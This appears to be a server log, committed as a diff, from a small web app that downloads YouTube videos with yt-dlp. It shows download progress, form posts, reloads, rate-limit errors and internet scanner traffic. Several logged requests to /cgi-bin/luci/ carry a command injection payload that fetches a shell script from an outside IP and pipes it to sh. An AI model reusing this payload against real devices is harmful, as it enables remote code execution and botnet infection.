00:07[download]  61.2% of   80.24MiB at    6.15MiB/s ETA 00:05[download]  61.2% of   80.24MiB at    9.31MiB/s ETA 00:03[download]  61.3% of   80.24MiB at   15.44MiB/s ETA 00:02[download]  61.3% of   80.24MiB at   26.17MiB/s ETA 00:01[download]  61.5% of   80.24MiB at   43.55MiB/s ETA 00:00[download]  61.8% of   80.24MiB at   69.60MiB/s ETA 00:00[download]  62.4% of   80.24MiB at  110.60MiB/s ETA 00:00[download]  63.7% of   80.24MiB at  161.31MiB/s ETA 00:00[download]  66.2% of   80.24MiB at  219.18MiB/s ETA 00:00[download]  71.2% of   80.24MiB at  241.83MiB/s ETA 00:00[download]  73.2% of   80.24MiB at  244.25MiB/s ETA 00:00[download]  73.2% of   80.24MiB at  Unknown B/s ETA Unknown[download]  73.2% of   80.24MiB at    1.67MiB/s ETA 00:13  [download]  73.2% of   80.24MiB at    2.27MiB/s ETA 00:09[download]  73.2% of   80.24MiB at    3.49MiB/s ETA 00:06[download]  73.2% of   80.24MiB at    5.49MiB/s ETA 00:03[download]  73.2% of   80.24MiB at    8.50MiB/s ETA 00:02[download]  73.3% of   80.24MiB at   14.56MiB/s ETA 00:01[download]  73.5% of   80.24MiB at   25.75MiB/s ETA 00:00[download]  73.8% of   80.24MiB at   43.86MiB/s ETA 00:00[download]  74.4% of   80.24MiB at   70.24MiB/s ETA 00:00[download]  75.7% of   80.24MiB at  105.42MiB/s ETA 00:00[download]  78.1% of   80.24MiB at  143.36MiB/s ETA 00:00[download]  83.1% of   80.24MiB at  170.08MiB/s ETA 00:00[download]  85.2% of   80.24MiB at  182.62MiB/s ETA 00:00[download]  85.2% of   80.24MiB at  Unknown B/s ETA Unknown[download]  85.2% of   80.24MiB at    2.24MiB/s ETA 00:05  [download]  85.2% of   80.24MiB at    2.92MiB/s ETA 00:04[download]  85.3% of   80.24MiB at    4.32MiB/s ETA 00:02[download]  85.3% of   80.24MiB at    6.56MiB/s ETA 00:01[download]  85.3% of   80.24MiB at   10.68MiB/s ETA 00:01[download]  85.4% of   80.24MiB at   17.64MiB/s ETA 00:00[download]  85.5% of   80.24MiB at   30.24MiB/s ETA 00:00[download]  85.9% of   80.24MiB at   51.37MiB/s ETA 00:00[download]  86.5% of   80.24MiB at   79.91MiB/s ETA 00:00[download]  87.7% of   80.24MiB at  122.25MiB/s ETA 00:00[download]  90.2% of   80.24MiB at  173.95MiB/s ETA 00:00[download]  95.2% of   80.24MiB at  208.04MiB/s ETA 00:00[download]  97.5% of   80.24MiB at  220.98MiB/s ETA 00:00[download]  97.5% of   80.24MiB at  Unknown B/s ETA Unknown[download]  97.5% of   80.24MiB at    2.08MiB/s ETA 00:00  [download]  97.5% of   80.24MiB at    2.75MiB/s ETA 00:00[download]  97.5% of   80.24MiB at    4.08MiB/s ETA 00:00[download]  97.5% of   80.24MiB at    6.61MiB/s ETA 00:00[download]  97.6% of   80.24MiB at   11.30MiB/s ETA 00:00[download]  97.7% of   80.24MiB at   19.41MiB/s ETA 00:00[download]  97.8% of   80.24MiB at   32.01MiB/s ETA 00:00[download]  98.1% of   80.24MiB at   54.17MiB/s ETA 00:00[download]  98.8% of   80.24MiB at   85.86MiB/s ETA 00:00[download] 100.0% of   80.24MiB at  124.26MiB/s ETA 00:00[download] 100% of   80.24MiB in 00:00:00 at 135.06MiB/s                                                         [download]   0.0% of   12.25MiB at  Unknown B/s ETA Unknown[download]   0.0% of   12.25MiB at    1.62MiB/s ETA 00:07  [download]   0.1% of   12.25MiB at    2.38MiB/s ETA 00:05[download]   0.1% of   12.25MiB at    3.75MiB/s ETA 00:03[download]   0.2% of   12.25MiB at    6.08MiB/s ETA 00:02[download]   0.5% of   12.25MiB at   10.05MiB/s ETA 00:01[download]   1.0% of   12.25MiB at   16.59MiB/s ETA 00:00[download]   2.0% of   12.25MiB at   27.95MiB/s ETA 00:00[download]   4.1% of   12.25MiB at   45.69MiB/s ETA 00:00[download]   8.2% of   12.25MiB at   71.47MiB/s ETA 00:00[download]  16.3% of   12.25MiB at  101.00MiB/s ETA 00:00[download]  32.6% of   12.25MiB at  122.63MiB/s ETA 00:00[download]  65.3% of   12.25MiB at  160.25MiB/s ETA 00:00[download]  79.3% of   12.25MiB at  167.92MiB/s ETA 00:00[download]  79.3% of   12.25MiB at  Unknown B/s ETA Unknown[download]  79.4% of   12.25MiB at  Unknown B/s ETA Unknown[download]  79.4% of   12.25MiB at    4.22MiB/s ETA 00:00  [download]  79.5% of   12.25MiB at    6.12MiB/s ETA 00:00[download]  79.6% of   12.25MiB at    8.83MiB/s ETA 00:00[download]  79.8% of   12.25MiB at   14.07MiB/s ETA 00:00[download]  80.3% of   12.25MiB at   23.14MiB/s ETA 00:00[download]  81.4% of   12.25MiB at   37.01MiB/s ETA 00:00[download]  83.4% of   12.25MiB at   59.11MiB/s ETA 00:00[download]  87.5% of   12.25MiB at   94.48MiB/s ETA 00:00[download]  95.7% of   12.25MiB at  138.60MiB/s ETA 00:00[download] 100.0% of   12.25MiB at  149.33MiB/s ETA 00:00[download] 100% of   12.25MiB in 00:00:00 at 113.11MiB/s                                                         response: Download Complete !!!
+INFO:     2.187.186.65:44070 - "POST /submit-form HTTP/1.1" 200 OK
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for connections to close. (CTRL+C to force quit)
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [5499]
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Started server process [5758]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of   80.24MiB at  324.16KiB/s ETA 04:17Processing URL: https://youtu.be/nXgsTObHfHw?si=GK8pAuEy7UIfLo54
+[download]   0.0% of   80.24MiB at  539.28KiB/s ETA 02:33[download]   0.0% of   80.24MiB at  989.19KiB/s ETA 01:23[download]   0.0% of   80.24MiB at    1.72MiB/s ETA 00:46[download]   0.0% of   80.24MiB at    3.10MiB/s ETA 00:25[download]   0.1% of   80.24MiB at    5.60MiB/s ETA 00:14[download]   0.2% of   80.24MiB at    9.58MiB/s ETA 00:08[download]   0.3% of   80.24MiB at   13.41MiB/s ETA 00:05[download]   0.6% of   80.24MiB at   18.58MiB/s ETA 00:04[download]   1.2% of   80.24MiB at   29.24MiB/s ETA 00:02[download]   2.5% of   80.24MiB at   46.26MiB/s ETA 00:01[download]   5.0% of   80.24MiB at   73.08MiB/s ETA 00:01[download]  10.0% of   80.24MiB at   93.52MiB/s ETA 00:00[download]  11.9% of   80.24MiB at  105.23MiB/s ETA 00:00[download]  11.9% of   80.24MiB at  Unknown B/s ETA Unknown[download]  11.9% of   80.24MiB at  Unknown B/s ETA Unknown[download]  11.9% of   80.24MiB at    5.73MiB/s ETA 00:12  [download]  11.9% of   80.24MiB at    8.39MiB/s ETA 00:08[download]  11.9% of   80.24MiB at   12.45MiB/s ETA 00:05[download]  11.9% of   80.24MiB at   20.03MiB/s ETA 00:03[download]  12.0% of   80.24MiB at   32.42MiB/s ETA 00:02[download]  12.2% of   80.24MiB at   52.11MiB/s ETA 00:01[download]  12.5% of   80.24MiB at   79.46MiB/s ETA 00:00[download]  13.1% of   80.24MiB at  120.09MiB/s ETA 00:00[download]  14.4% of   80.24MiB at  172.45MiB/s ETA 00:00[download]  16.8% of   80.24MiB at  223.27MiB/s ETA 00:00[download]  21.8% of   80.24MiB at  165.56MiB/s ETA 00:00[download]  24.2% of   80.24MiB at  167.82MiB/s ETA 00:00[download]  24.2% of   80.24MiB at  Unknown B/s ETA Unknown[download]  24.2% of   80.24MiB at  Unknown B/s ETA Unknown[download]  24.2% of   80.24MiB at    4.72MiB/s ETA 00:12  [download]  24.2% of   80.24MiB at    6.81MiB/s ETA 00:08[download]  24.2% of   80.24MiB at   10.46MiB/s ETA 00:05[download]  24.2% of   80.24MiB at   17.23MiB/s ETA 00:03[download]  24.3% of   80.24MiB at   29.36MiB/s ETA 00:02[download]  24.5% of   80.24MiB at   48.33MiB/s ETA 00:01[download]  24.8% of   80.24MiB at   77.20MiB/s ETA 00:00[download]  25.4% of   80.24MiB at  120.22MiB/s ETA 00:00[download]  26.7% of   80.24MiB at  167.15MiB/s ETA 00:00[download]  29.2% of   80.24MiB at  217.67MiB/s ETA 00:00[download]  34.1% of   80.24MiB at  220.64MiB/s ETA 00:00[download]  36.3% of   80.24MiB at  217.06MiB/s ETA 00:00[download]  36.3% of   80.24MiB at  Unknown B/s ETA Unknown[download]  36.3% of   80.24MiB at    1.55MiB/s ETA 00:33  [download]  36.3% of   80.24MiB at    2.31MiB/s ETA 00:22[download]  36.3% of   80.24MiB at    3.48MiB/s ETA 00:14[download]  36.3% of   80.24MiB at    5.41MiB/s ETA 00:09[download]  36.3% of   80.24MiB at    8.78MiB/s ETA 00:05[download]  36.4% of   80.24MiB at   14.86MiB/s ETA 00:03[download]  36.6% of   80.24MiB at   24.32MiB/s ETA 00:02[download]  36.9% of   80.24MiB at   37.69MiB/s ETA 00:01[download]  37.5% of   80.24MiB at   60.89MiB/s ETA 00:00[download]  38.8% of   80.24MiB at   94.88MiB/s ETA 00:00[download]  41.2% of   80.24MiB at  141.78MiB/s ETA 00:00[download]  46.2% of   80.24MiB at  189.02MiB/s ETA 00:00[download]  48.1% of   80.24MiB at  199.22MiB/s ETA 00:00[download]  48.1% of   80.24MiB at  Unknown B/s ETA Unknown[download]  48.1% of   80.24MiB at  Unknown B/s ETA Unknown[download]  48.1% of   80.24MiB at    4.24MiB/s ETA 00:09  [download]  48.2% of   80.24MiB at    6.54MiB/s ETA 00:06[download]  48.2% of   80.24MiB at   10.16MiB/s ETA 00:04[download]  48.2% of   80.24MiB at   16.28MiB/s ETA 00:02[download]  48.3% of   80.24MiB at   26.56MiB/s ETA 00:01[download]  48.4% of   80.24MiB at   41.62MiB/s ETA 00:00[download]  48.8% of   80.24MiB at   65.29MiB/s ETA 00:00[download]  49.4% of   80.24MiB at   99.22MiB/s ETA 00:00[download]  50.6% of   80.24MiB at  144.86MiB/s ETA 00:00[download]  53.1% of   80.24MiB at  199.60MiB/s ETA 00:00[download]  58.1% of   80.24MiB at  217.95MiB/s ETA 00:00[download]  60.1% of   80.24MiB at  216.45MiB/s ETA 00:00[download]  60.1% of   80.24MiB at  Unknown B/s ETA Unknown[download]  60.1% of   80.24MiB at    2.73MiB/s ETA 00:12  [download]  60.1% of   80.24MiB at    3.94MiB/s ETA 00:08[download]  60.1% of   80.24MiB at    5.53MiB/s ETA 00:05[download]  60.1% of   80.24MiB at    8.54MiB/s ETA 00:03[download]  60.2% of   80.24MiB at   13.23MiB/s ETA 00:02[download]  60.2% of   80.24MiB at   21.55MiB/s ETA 00:01[download]  60.4% of   80.24MiB at   33.78MiB/s ETA 00:00[download]  60.7% of   80.24MiB at   53.66MiB/s ETA 00:00[download]  61.3% of   80.24MiB at   82.00MiB/s ETA 00:00[download]  62.6% of   80.24MiB at  131.11MiB/s ETA 00:00[download]  65.1% of   80.24MiB at  190.65MiB/s ETA 00:00[download]  70.1% of   80.24MiB at  214.78MiB/s ETA 00:00[download]  72.5% of   80.24MiB at  224.84MiB/s ETA 00:00[download]  72.5% of   80.24MiB at  Unknown B/s ETA Unknown[download]  72.5% of   80.24MiB at  913.53KiB/s ETA 00:24  [download]  72.5% of   80.24MiB at    1.16MiB/s ETA 00:19[download]  72.5% of   80.24MiB at    1.95MiB/s ETA 00:11[download]  72.6% of   80.24MiB at    3.41MiB/s ETA 00:06[download]  72.6% of   80.24MiB at    5.79MiB/s ETA 00:03[download]  72.7% of   80.24MiB at   10.10MiB/s ETA 00:02[download]  72.8% of   80.24MiB at   16.67MiB/s ETA 00:01[download]  73.1% of   80.24MiB at   28.43MiB/s ETA 00:00[download]  73.8% of   80.24MiB at   48.86MiB/s ETA 00:00[download]  75.0% of   80.24MiB at   79.11MiB/s ETA 00:00[download]  77.5% of   80.24MiB at  123.99MiB/s ETA 00:00[download]  82.5% of   80.24MiB at  173.75MiB/s ETA 00:00[download]  84.6% of   80.24MiB at  187.30MiB/s ETA 00:00[download]  84.6% of   80.24MiB at  Unknown B/s ETA Unknown[download]  84.6% of   80.24MiB at    1.03MiB/s ETA 00:12  [download]  84.6% of   80.24MiB at    1.27MiB/s ETA 00:09[download]  84.6% of   80.24MiB at    2.04MiB/s ETA 00:06[download]  84.7% of   80.24MiB at    3.43MiB/s ETA 00:03[download]  84.7% of   80.24MiB at    6.15MiB/s ETA 00:01[download]  84.8% of   80.24MiB at   10.83MiB/s ETA 00:01[download]  84.9% of   80.24MiB at   18.26MiB/s ETA 00:00[download]  85.2% of   80.24MiB at   30.00MiB/s ETA 00:00[download]  85.9% of   80.24MiB at   49.21MiB/s ETA 00:00[download]  87.1% of   80.24MiB at   81.53MiB/s ETA 00:00[download]  89.6% of   80.24MiB at  124.51MiB/s ETA 00:00[download]  94.6% of   80.24MiB at  163.31MiB/s ETA 00:00[download]  96.8% of   80.24MiB at  173.20MiB/s ETA 00:00[download]  96.8% of   80.24MiB at  Unknown B/s ETA Unknown[download]  96.8% of   80.24MiB at    2.04MiB/s ETA 00:01  [download]  96.8% of   80.24MiB at    2.96MiB/s ETA 00:00[download]  96.8% of   80.24MiB at    4.01MiB/s ETA 00:00[download]  96.9% of   80.24MiB at    6.62MiB/s ETA 00:00[download]  96.9% of   80.24MiB at   11.32MiB/s ETA 00:00[download]  97.0% of   80.24MiB at   19.02MiB/s ETA 00:00[download]  97.1% of   80.24MiB at   32.50MiB/s ETA 00:00[download]  97.4% of   80.24MiB at   56.00MiB/s ETA 00:00[download]  98.1% of   80.24MiB at   91.33MiB/s ETA 00:00[download]  99.3% of   80.24MiB at  148.22MiB/s ETA 00:00[download] 100.0% of   80.24MiB at  166.59MiB/s ETA 00:00[download] 100% of   80.24MiB in 00:00:00 at 120.77MiB/s                                                         [download]   0.0% of   12.25MiB at  Unknown B/s ETA Unknown[download]   0.0% of   12.25MiB at    1.15MiB/s ETA 00:10  [download]   0.1% of   12.25MiB at    1.85MiB/s ETA 00:06[download]   0.1% of   12.25MiB at    2.92MiB/s ETA 00:04[download]   0.2% of   12.25MiB at    4.76MiB/s ETA 00:02[download]   0.5% of   12.25MiB at    7.86MiB/s ETA 00:01[download]   1.0% of   12.25MiB at   13.25MiB/s ETA 00:00[download]   2.0% of   12.25MiB at   23.12MiB/s ETA 00:00[download]   4.1% of   12.25MiB at   33.43MiB/s ETA 00:00[download]   8.2% of   12.25MiB at   59.39MiB/s ETA 00:00[download]  16.3% of   12.25MiB at   99.19MiB/s ETA 00:00[download]  32.6% of   12.25MiB at  149.14MiB/s ETA 00:00[download]  65.3% of   12.25MiB at  171.15MiB/s ETA 00:00[download]  80.1% of   12.25MiB at  176.59MiB/s ETA 00:00[download]  80.1% of   12.25MiB at  Unknown B/s ETA Unknown[download]  80.1% of   12.25MiB at    1.84MiB/s ETA 00:01  [download]  80.1% of   12.25MiB at    2.52MiB/s ETA 00:00[download]  80.2% of   12.25MiB at    4.20MiB/s ETA 00:00[download]  80.3% of   12.25MiB at    6.94MiB/s ETA 00:00[download]  80.6% of   12.25MiB at   11.50MiB/s ETA 00:00[download]  81.1% of   12.25MiB at   19.13MiB/s ETA 00:00[download]  82.1% of   12.25MiB at   31.70MiB/s ETA 00:00[download]  84.1% of   12.25MiB at   53.06MiB/s ETA 00:00[download]  88.2% of   12.25MiB at   84.65MiB/s ETA 00:00[download]  96.4% of   12.25MiB at  130.12MiB/s ETA 00:00[download] 100.0% of   12.25MiB at  141.06MiB/s ETA 00:00[download] 100% of   12.25MiB in 00:00:00 at 114.84MiB/s                                                         response: Download Complete !!!
+INFO:     2.187.186.65:45682 - "POST /submit-form HTTP/1.1" 200 OK
+INFO:     2.187.186.65:45684 - "GET /submit-form HTTP/1.1" 405 Method Not Allowed
+INFO:     2.187.186.65:48336 - "GET / HTTP/1.1" 200 OK
+[download]   0.0% of    5.97MiB at  319.08KiB/s ETA 00:19Processing URL: https://youtu.be/4cGqJJoRLyc?si=bOMrBN1lau5cH9Ec
+[download]   0.0% of    5.97MiB at  684.11KiB/s ETA 00:08[download]   0.1% of    5.97MiB at    1.27MiB/s ETA 00:04[download]   0.2% of    5.97MiB at    2.29MiB/s ETA 00:02[download]   0.5% of    5.97MiB at    4.18MiB/s ETA 00:01[download]   1.0% of    5.97MiB at    7.48MiB/s ETA 00:00[download]   2.1% of    5.97MiB at    9.05MiB/s ETA 00:00[download]   4.2% of    5.97MiB at   13.39MiB/s ETA 00:00[download]   8.4% of    5.97MiB at   19.19MiB/s ETA 00:00[download]  16.7% of    5.97MiB at   29.41MiB/s ETA 00:00[download]  33.5% of    5.97MiB at   44.20MiB/s ETA 00:00[download]  67.0% of    5.97MiB at   59.69MiB/s ETA 00:00[download] 100.0% of    5.97MiB at   75.32MiB/s ETA 00:00[download] 100% of    5.97MiB in 00:00:00 at 36.19MiB/s                                                         [download]   0.0% of    7.77MiB at  Unknown B/s ETA Unknown[download]   0.0% of    7.77MiB at    2.23MiB/s ETA 00:03  [download]   0.1% of    7.77MiB at    3.54MiB/s ETA 00:02[download]   0.2% of    7.77MiB at    5.91MiB/s ETA 00:01[download]   0.4% of    7.77MiB at   10.05MiB/s ETA 00:00[download]   0.8% of    7.77MiB at   16.73MiB/s ETA 00:00[download]   1.6% of    7.77MiB at   26.86MiB/s ETA 00:00[download]   3.2% of    7.77MiB at   42.22MiB/s ETA 00:00[download]   6.4% of    7.77MiB at   67.54MiB/s ETA 00:00[download]  12.9% of    7.77MiB at  105.23MiB/s ETA 00:00[download]  25.7% of    7.77MiB at  155.26MiB/s ETA 00:00[download]  51.5% of    7.77MiB at   50.10MiB/s ETA 00:00[download] 100.0% of    7.77MiB at   33.72MiB/s ETA 00:00[download] 100% of    7.77MiB in 00:00:00 at 27.89MiB/s                                                         response: Download Complete !!!
+INFO:     2.187.186.65:48338 - "POST /submit-form HTTP/1.1" 200 OK
+INFO:     2.187.186.65:44864 - "GET /submit-form HTTP/1.1" 405 Method Not Allowed
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [5758]
+INFO:     Started server process [5796]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [5796]
+INFO:     Started server process [5809]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [5809]
+INFO:     Started server process [5816]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/4cGqJJoRLyc?si=bOMrBN1lau5cH9Ec
+response: ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:54002 - "POST /submit-form HTTP/1.1" 400 Bad Request
+ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/4cGqJJoRLyc?si=bOMrBN1lau5cH9Ec
+response: ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:54002 - "POST /submit-form HTTP/1.1" 400 Bad Request
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [5816]
+INFO:     Started server process [5827]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+WARNING:  WatchFiles detected changes in 'main.py'. Reloading...
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [5827]
+INFO:     Started server process [5833]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/4cGqJJoRLyc?si=bOMrBN1lau5cH9Ec
+response: ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:36740 - "POST /submit-form HTTP/1.1" 400 Bad Request
+ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+Processing URL: https://youtu.be/4cGqJJoRLyc?si=bOMrBN1lau5cH9Ec
+response: ERROR: [youtube] 4cGqJJoRLyc: Sign in to confirm you’re not a bot. This helps protect our community. Learn more
+INFO:     2.187.186.65:36740 - "POST /submit-form HTTP/1.1" 400 Bad Request
+WARNING: [youtube] Failed to download m3u8 information: HTTP Error 429: Too Many Requests
+[download]   0.0% of    5.97MiB at  393.28KiB/s ETA 00:15Processing URL: https://youtu.be/4cGqJJoRLyc?si=bOMrBN1lau5cH9Ec
+[download]   0.0% of    5.97MiB at  646.90KiB/s ETA 00:09[download]   0.1% of    5.97MiB at  997.39KiB/s ETA 00:06[download]   0.2% of    5.97MiB at    1.60MiB/s ETA 00:03[download]   0.5% of    5.97MiB at    2.73MiB/s ETA 00:02[download]   1.0% of    5.97MiB at    4.63MiB/s ETA 00:01[download]   2.1% of    5.97MiB at    8.29MiB/s ETA 00:00[download]   4.2% of    5.97MiB at   11.99MiB/s ETA 00:00[download]   8.4% of    5.97MiB at   17.21MiB/s ETA 00:00[download]  16.7% of    5.97MiB at   27.19MiB/s ETA 00:00[download]  33.5% of    5.97MiB at   43.15MiB/s ETA 00:00[download]  67.0% of    5.97MiB at   61.72MiB/s ETA 00:00[download] 100.0% of    5.97MiB at   55.20MiB/s ETA 00:00[download] 100% of    5.97MiB in 00:00:00 at 40.41MiB/s                                                         [download]   0.0% of    7.77MiB at  Unknown B/s ETA Unknown[download]   0.0% of    7.77MiB at  655.26KiB/s ETA 00:12  [download]   0.1% of    7.77MiB at    1.19MiB/s ETA 00:06[download]   0.2% of    7.77MiB at    2.14MiB/s ETA 00:03[download]   0.4% of    7.77MiB at    3.76MiB/s ETA 00:02[download]   0.8% of    7.77MiB at    6.68MiB/s ETA 00:01[download]   1.6% of    7.77MiB at   11.89MiB/s ETA 00:00[download]   3.2% of    7.77MiB at   21.03MiB/s ETA 00:00[download]   6.4% of    7.77MiB at   37.17MiB/s ETA 00:00[download]  12.9% of    7.77MiB at   64.15MiB/s ETA 00:00[download]  25.7% of    7.77MiB at  104.06MiB/s ETA 00:00[download]  51.5% of    7.77MiB at   38.62MiB/s ETA 00:00[download] 100.0% of    7.77MiB at   55.52MiB/s ETA 00:00[download] 100% of    7.77MiB in 00:00:00 at 40.61MiB/s                                                         response: Download Complete !!!
+INFO:     2.187.186.65:36730 - "POST /submit-form HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     154.213.184.18:35644 - "CONNECT example.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.59:45488 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.129.46:39394 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.129.46:39402 - "GET /_ignition/health-check HTTP/1.1" 404 Not Found
+INFO:     45.125.66.171:47366 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.83:51798 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     185.224.128.84:58370 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     154.213.184.25:34044 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     154.213.184.25:56402 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     198.235.24.129:64896 - "GET / HTTP/1.1" 200 OK
+INFO:     185.224.128.59:58802 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:47522 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:54140 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.53:54194 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.146.53:54230 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     154.213.184.18:33240 - "CONNECT example.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.83:45820 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     185.224.128.84:49702 - "GET / HTTP/1.1" 200 OK
+INFO:     64.226.79.183:21222 - "GET / HTTP/1.1" 200 OK
+INFO:     185.224.128.59:37264 - "GET / HTTP/1.1" 200 OK
+INFO:     109.123.232.100:50646 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     154.213.184.25:33918 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.249.225.89:60040 - "CONNECT codeforces.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     45.125.66.171:51964 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.84:53740 - "GET / HTTP/1.1" 200 OK
+INFO:     51.116.106.117:49765 - "GET http%3A//judge4.api.proxyscrape.com/ HTTP/1.1" 404 Not Found
+INFO:     51.116.106.117:49766 - "CONNECT ssl-judge1.api.proxyscrape.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     78.108.177.51:37974 - "GET / HTTP/1.0" 200 OK
+INFO:     154.213.184.25:42820 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.59:44954 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.40:41996 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.40:36830 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.40:36834 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     162.142.125.40:36836 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.197.106:58139 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.100:51589 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     64.62.197.95:49445 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     64.62.197.102:17841 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     64.62.197.101:29837 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     154.213.184.25:39708 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.83:53966 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     185.224.128.84:36450 - "GET / HTTP/1.1" 200 OK
+INFO:     185.224.128.59:41396 - "GET / HTTP/1.1" 200 OK
+INFO:     103.75.182.160:45114 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     109.123.232.100:50324 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     147.185.132.249:52361 - "GET / HTTP/1.0" 200 OK
+INFO:     172.206.139.14:54974 - "GET / HTTP/1.1" 200 OK
+INFO:     154.213.184.18:53958 - "CONNECT example.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     154.213.184.25:42836 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     185.224.128.83:43386 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.237%3A88%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     185.224.128.59:44810 - "GET / HTTP/1.1" 200 OK
+INFO:     185.224.128.84:47026 - "GET / HTTP/1.1" 200 OK
+INFO:     45.125.66.171:45948 - "CONNECT google.com%3A443 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     185.180.140.4:50366 - "GET / HTTP/1.1" 200 OK
